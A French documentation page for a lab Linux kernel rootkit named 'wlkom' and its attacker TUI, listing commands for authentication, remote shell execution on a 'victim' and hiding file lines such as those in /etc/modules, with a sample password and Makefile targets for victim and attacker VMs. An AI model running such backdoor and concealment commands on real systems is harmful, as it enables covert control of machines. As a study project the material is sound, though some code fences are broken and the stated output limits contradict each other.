# Commandes

Il y a deux types de commandes dans ce projet :

- **Commandes protocole** : tapées dans l'interface, envoyées au rootkit via TCP (XORées)
- **Commandes locales** : interprétées par le programme attaquant lui-même, non transmises au rootkit

---

## Commandes protocole

### PING

Vérifie que le rootkit répond.

```
>> PING
PONG
```

Ne nécessite pas d'authentification.

---

### AUTH

Authentifie la session avec le mot de passe du rootkit.

```
>> AUTH wlkom
OK authenticated
```

```
>> AUTH mauvais_mdp
ERR bad password
```

Le mot de passe est vérifié par hash djb2 (`0x10a572ef`) côté kernel. Une fois authentifié, les commandes réservées deviennent accessibles. Voir [Connexion](connection.md) pour les détails.

---

### HELP

Liste les commandes disponibles reconnues par le rootkit.

````
>> HELP
[LOCAL COMMANDS] (no rootkit needed)
  STOP | QUIT | EXIT | Q          Quit the attacking program
  HASHPASS <pass>                 Compute DJB2 hash of <pass> (for kernel recompile)
  HELP                            Show this help
[ROOTKIT COMMANDS] (require connection, no authentication needed)                                                                                                                          │
  PING                            Liveness check : rootkit replies PONG                                                                                                                    │
  AUTH <password>                 Authenticate with the rootkit                                                                                                                            │
  LOGOUT                          Send QUIT to the rootkit : closes the session (rootkit will auto-reconnect)                                                                              │
[ROOTKIT COMMANDS] (require connection + authentication)                                                                                                                                   │
  INFO                            Get victim system info (replies sysname, release, machine from utsname)                                                                                  │
  EXEC <command>                  Run a shell command on the victim (space-separated args, cwd persists across calls)                                                                      │
[HIDE COMMANDS] (require connection + authentication)                                                                                                                                      │
  HIDE_ADD <pattern> <filepath>   Hide lines matching <pattern> in <filepath> (pattern must not contain spaces)                                                                            │
  HIDE_DEL <pattern> <filepath>   Stop hiding lines matching <pattern> in <filepath> (error if not found)                                                                                  │
  HIDE_INFO                       List all currently registered hidden patterns and their associated file                                                                                  │
  HIDE_HELP                       Show rootkit help for HIDE_* commands
```

Ne nécessite pas d'authentification.

!!! note "HELP dans le programme attaquant = aide locale"
    Taper `HELP` (ou `help`) dans l'interface TUI affiche l'aide locale du programme attaquant (liste de toutes les commandes disponibles) : la commande n'est **pas** transmise au rootkit. Pour interroger le rootkit directement, il faut une connexion TCP brute (ex. netcat).

---

### INFO

Retourne les informations système de la machine victime.

````

> > INFO
> > sysname=Linux release=5.15.0-78-generic machine=x86_64

```

Les champs correspondent aux valeurs de `utsname()` : nom du système, version du noyau, architecture.

!!! warning "Authentification requise"
    `INFO` retourne `ERR unauthorized` si la session n'est pas authentifiée.

---

### EXEC

Exécute une commande shell sur la machine victime et retourne sa sortie.

```

> > EXEC ls /home
> > victim
> > EXIT:0 PWD:/

```

```

> > EXEC pwd
> > /
> > EXIT:0 PWD:/

```

```

> > EXEC cd /tmp
> > EXIT:0 PWD:/tmp

```

- Exécution via `/bin/sh -c` en kernel-space (`call_usermodehelper`)
- Le contexte `PWD` est maintenu entre les commandes : `cd` fonctionne et persiste d'une commande à l'autre
- La sortie stdout et stderr sont limitées à **255 caractères** chacune (buffer de 256 octets côté rootkit)
- La sortie stderr apparaît en rouge (préfixée par ⚠) séparément de stdout
- La dernière ligne retournée par le rootkit est `EXIT:<code> PWD:<path>` (parsée silencieusement par le TUI pour mettre à jour le prompt : elle n'apparaît pas dans les logs)
- Réponse d'erreur possible : `ERR exec failed` (échec de `call_usermodehelper`)

!!! warning "Authentification requise"

---

### QUIT

Commande protocole : demande au rootkit de fermer la session TCP en cours. Le rootkit répond `BYE`, ferme la socket, puis retente de se connecter après 3 secondes. Ne décharge pas le module.

!!! danger "QUIT dans le TUI quitte le programme attaquant"
    Dans l'interface du programme attaquant, `QUIT` (ainsi que `quit`, `exit`, `q`, `stop`) est intercepté **localement** et ferme le programme attaquant : il n'est **pas** transmis au rootkit. Pour fermer la session TCP du rootkit sans quitter le programme attaquant, utilisez `LOGOUT`.

```

> > LOGOUT

```

Le rootkit répond en interne `BYE` et se reconnecte dans 3 secondes.

---

### HIDE_ADD

Ajoute un pattern à masquer dans un fichier spécifique.

```

> > HIDE_ADD wlkom /etc/modules
> > Wlkom_response : hide line correctly added

```

Les lectures ultérieures du fichier par n'importe quel processus userspace ne verront plus les lignes contenant ce pattern.

!!! warning "Authentification requise"
!!! note "Le pattern ne doit pas contenir d'espace"
    Le premier token après `HIDE_ADD ` est le pattern, le reste est le chemin. Un espace dans le pattern provoquera un découpage incorrect.

---

### HIDE_DEL

Supprime un pattern de la liste de masquage.

```

> > HIDE_DEL wlkom /etc/modules
> > Wlkom_response : hide line correctly deleted

```

```

> > HIDE_DEL inconnu /etc/modules
> > ERR pattern not found

```

!!! warning "Authentification requise"

---

### HIDE_INFO

Liste tous les patterns de masquage actifs.

```

> > HIDE_INFO
> > pattern=wlkom path=/etc/modules
> > END

```

Chaque règle active est affichée sur une ligne au format `pattern=<p> path=<f>`. La liste se termine par `END`.

!!! warning "Authentification requise"

---

### HIDE_HELP

Affiche l'aide des commandes de masquage.

```

> > HIDE_HELP
> > -> HIDE_ADD <pattern_to_hide> <path_to_file>

    -> Add a pattern to hide in a specific file

-> HIDE_DEL <pattern_to_hide> <path_to_file>
-> Delete a pattern
-> HIDE_INFO
-> List all the hidded pattern and their file

```

!!! warning "Authentification requise"

---

## Commandes locales

Ces commandes sont traitées par le programme attaquant lui-même et ne sont **pas transmises** au rootkit.

### stop / quit / exit / q

Arrête le programme attaquant proprement.

```

> > stop

```

Ferme toutes les connexions TCP ouvertes avant de quitter. Équivalent à `Ctrl+C` ou `Ctrl+D`.

---

### LOGOUT

Envoie `QUIT` au rootkit pour fermer la session TCP active. Le rootkit se reconnecte automatiquement après 3 secondes.

```

> > LOGOUT

```

Contrairement à `stop`, `LOGOUT` ne quitte pas le programme attaquant.

---

### HASHPASS

Calcule le hash DJB2 d'un mot de passe et affiche la valeur à reporter dans le code source du rootkit.

```

> > HASHPASS mon_nouveau_mdp
> > [HASHPASS] DJB2("mon_nouveau_mdp") = 0x4a7f3b21
> > [HASHPASS] #define WLKOM_PASSWORD_HASH 0x4a7f3b21

```

Utile pour changer le mot de passe du rootkit sans avoir à calculer le hash manuellement. La valeur affichée est à copier dans `rootkit/src/connection.c` à la ligne définissant `WLKOM_PASSWORD_HASH`, puis recompiler et recharger le module.

!!! note "Calcul purement local"
    `HASHPASS` n'envoie rien au rootkit. Le calcul se fait entièrement côté attaquant et le résultat s'affiche dans le journal.

---

## Tableau récapitulatif

| Commande | Type | Auth requise | Réponse succès | Réponse erreur |
| :------- | :--: | :----------: | :------------- | :------------- |
| `PING` | Protocole | Non | `PONG` | - |
| `AUTH <mdp>` | Protocole | Non | `OK authenticated` | `ERR bad password` |
| `HELP` | Protocole | Non | `OK commands: PING AUTH HELP INFO EXEC QUIT` | - |
| `INFO` | Protocole | **Oui** | `sysname=... release=... machine=...` | `ERR unauthorized` |
| `EXEC <cmd>` | Protocole | **Oui** | sortie + `EXIT:<code> PWD:<path>` | `ERR exec failed` |
| `QUIT` | Protocole | Non | `BYE` (via LOGOUT uniquement : taper QUIT dans le TUI quitte le programme) | - |
| `HIDE_ADD <p> <f>` | Protocole | **Oui** | `Wlkom_response : hide line correctly added` | `ERR unauthorized` |
| `HIDE_DEL <p> <f>` | Protocole | **Oui** | `Wlkom_response : hide line correctly deleted` | `ERR pattern not found` |
| `HIDE_INFO` | Protocole | **Oui** | liste des patterns + `END` | `ERR unauthorized` |
| `HIDE_HELP` | Protocole | **Oui** | aide | `ERR unauthorized` |
| Inconnue | Protocole | **Oui** | - | `ERR unknown command` |
| `stop` / `quit` / `exit` / `q` | Local | - | *(programme quitte)* | - |
| `LOGOUT` | Local | - | *(envoie QUIT au rootkit)* | - |
| `HASHPASS <mdp>` | Local | - | hash affiché dans les logs | - |

!!! warning "Limite de taille"
    Chaque commande protocole est limitée à **255 caractères** (buffer de 256 octets côté rootkit). La sortie de `EXEC` est également tronquée à 127 caractères.

---

## Référence Makefile

### Racine du projet

| Commande | Effet |
| :------- | :---- |
| `make` / `make start` | Lance les deux VMs (victime + attaquante) |
| `make victim` | Lance uniquement la VM victime |
| `make attacking` | Lance uniquement la VM attaquante |
| `make reset` | Supprime les images des deux VMs et repart de zéro |
| `make docs` | Génère la documentation MkDocs |
| `make clean` | Nettoie les artefacts des deux VMs et de la doc |

### VM attaquante (`vms/attacking/`)

| Commande | Effet |
| :------- | :---- |
| `make` / `make start` | Lance la VM (télécharge l'image si absente) |
| `make reset` | Supprime `build/` et relance depuis zéro |
| `make clean` | Supprime le dossier `build/` |

### VM victime (`vms/victim/`)

| Commande | Effet |
| :------- | :---- |
| `make` / `make start` | Lance la VM (télécharge l'image si absente) |
| `make reset` | Supprime `build/` et relance depuis zéro |
| `make clean` | Supprime le dossier `build/` |

### Programme attaquant (`attacking_program/`), dans la VM ou sur l'hôte

| Commande | Effet |
| :------- | :---- |
| `make` / `make start` | Installe (si nécessaire) et lance le programme |
| `make install` | Crée le virtualenv et installe les dépendances |
| `make glob-install` | Installation globale sans virtualenv (utilisé dans la VM) |
| `make clean` | Supprime `.venv`, `__pycache__` et les artefacts build |

### Rootkit (`rootkit/`), dans la VM victime

| Commande | Effet |
| :------- | :---- |
| `make module` | Compile `wlkom.ko` |
| `make clean` | Supprime les fichiers compilés |
```
